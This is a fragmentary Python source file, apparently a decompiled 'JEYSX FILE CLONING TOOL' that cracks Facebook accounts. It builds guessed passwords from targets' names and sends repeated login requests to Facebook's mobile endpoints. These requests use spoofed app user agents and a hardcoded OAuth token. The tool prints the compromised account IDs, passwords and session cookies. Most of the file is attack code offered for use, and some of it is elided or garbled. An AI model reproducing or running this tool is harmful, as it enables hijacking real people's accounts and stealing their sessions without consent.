...
[\033[1;96m●\033[1;96m] VERSION   \033[1;96m፧ \033[1;96m3.6
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
tokenku=[]
# LOGIN_KEY
correct_username = 'JEYSXLOL'
key = 'true'

while key == 'true':
    username = input(' \33[0;91m[+] ❯\33[1;91m PLEASE ENTER KEY\33[1;91m ፧ ')

    if username == correct_username:
        print('\33[1;93m [+] ❯ JEYSX FILE CLONING TOOL ')
        print('\33[1;93m [+] ❯ ADMIN   – ፧ JAEI SIRVUIX ')
        print('\33[1;93m [+] ❯ STATUS  – ፧ PERSONAL TOOL ')
        print('\33[1;93m [+] ❯ PLEASE WAIT... ')
        time.sleep(6)
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 7; SM-G313HY Build/WWG22Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5180.140 YaBrowser/21.9.9.154 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;91m╭──────[+] ALIVE ID   ❯ %s'%(ids))
                                print(f'\r\r\033[1;94m│──────[+] PASSWORD   ❯ %s'%(pas))
                                print(f'\r\r\033[1;93m│──────[+] FB LINK    ❯ https://facebook.com/%s'%(ids))
                                print(f'\r\r\033[1;93m│──────[+] SINCE    ❯ %s'%(xd(uid)))
                                print('f\r\r\033[1;96m╰──────[+] COOKIES    ❯ %s '%(kuki))
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\033[1;91m╭──────[+] DEAD ID   ❯ %s'%(ids))
...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9118 Build/OXB88D) [FBAN/Orca-Android;FBAV/441.0.0.18.130;FBBV/25050404;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/GT-I9118;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
...
def ffb7(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mobile.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': '[FBAN/FB4A;FBAV/389.0.0.12.101;FBBV/568392086;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/294375284;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P350;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			'user-agent': '[FBAN/Orca-Android;FBAV/449.0.0.14.136;FBBV/22170359;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/GT-S5690R;FBSV/5.0;FBCA/armeabi-v7a:armeabi;]'}
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                head = {
                                        ...
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; TECNO KE6j Build/RQ1D.561114.031) [FBAN/FB4A;FBAV/289.0.0.17.83;FBBV/935571532;FBRV/0;FBPN/com.facebook.katana;FBLC/ko_KR;FBMF/Android;FBBD/Android;FBDV/TECNO KE6j;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
